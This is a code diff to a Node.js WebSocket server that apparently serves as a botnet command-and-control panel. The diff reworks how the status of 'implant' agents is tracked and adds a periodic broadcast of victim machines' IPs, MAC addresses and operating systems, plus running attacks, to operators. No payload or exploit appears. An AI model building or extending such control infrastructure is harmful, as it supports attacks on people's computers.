@@ -88,7 +88,7 @@ const webSocketsServer = async (httpServer, attacks_running, agents, status_conn
         /* console.log("db:",c.impl_id); */
         
         //Agents.agents status
-        const ws = agents.agents.get(c.impl_id);
+/*         const ws = agents.agents.get(c.impl_id);
         if (ws) {
           if (ws.isAlive) {
             status_connections.status_connections.push({ id: c.impl_id, status: 'active', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
@@ -98,9 +98,37 @@ const webSocketsServer = async (httpServer, attacks_running, agents, status_conn
         } else {
           status_connections.status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
         }
-      });
+     */      
+        const ws = agents.agents.get(c.impl_id);
+        const arr_index = status_connections.status_connections.findIndex(i=>i.id === c.impl_id)
 
-  
+        if(arr_index !== -1){
+          
+          if (ws) {
+            if (ws.isAlive) {
+              status_connections.status_connections[arr_index] = { ...status_connections.status_connections[arr_index], status: 'active'};
+            } else {
+              status_connections.status_connections[arr_index] = { ...status_connections.status_connections[arr_index], status: 'inactive'};
+            }
+          } else {
+            status_connections.status_connections[arr_index] = { ...status_connections.status_connections[arr_index], status: 'inactive'};
+          } 
+          
+        }else{
+
+           if (ws) {
+            if (ws.isAlive) {
+              status_connections.status_connections.push({ id: c.impl_id, status: 'active', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
+            } else {
+              status_connections.status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
+            }
+          } else {
+            status_connections.status_connections.push({ id: c.impl_id, status: 'inactive', impl_mac: c.impl_mac, group: c.group, public_ip: c.public_ip, local_ip: c.local_ip, operating_system: c.operating_system });
+          }
+        }
+    
+      }); 
+      
 
 
     }, 2000);
@@ -138,6 +166,7 @@ const main_ws_server = async (httpServer, attacks_running, agents, status_connec
             users.delete(socket);
           });
 
+          
         } catch (err) {
           console.log('Invalid JWT', err.message);
           socket.send('invalid')
@@ -156,14 +185,35 @@ const main_ws_server = async (httpServer, attacks_running, agents, status_connec
         botnet: attacks_running.attacks,
         events: readLastLines()
       };
-      
-      
-    // Reenviar a todos los users
-    users.forEach(userSocket => {
-      if (userSocket.readyState === userSocket.OPEN) {
-        userSocket.send(JSON.stringify(payload));
-      }
+
+
+
+      socket.on('close', () => {
+        writeLog(` | Agent ${clientId} disconnected`)
+        agents.agents.delete(clientId);
+      });
     });
+
+    const interval = setInterval(async () => {
+      
+      
+      // Enviar estados a todos los users conectados
+      const payload = {
+        data: status_connections.status_connections,
+        botnet: attacks_running.attacks,
+        events: readLastLines()
+      };
+
+      
+      // Reenviar a todos los users
+      users.forEach(userSocket => {
+        if (userSocket.readyState === userSocket.OPEN) {
+          userSocket.send(JSON.stringify(payload));
+        }
+      });
+
+
+
     }, 2000);
 
     server.on("close", () => clearInterval(interval));
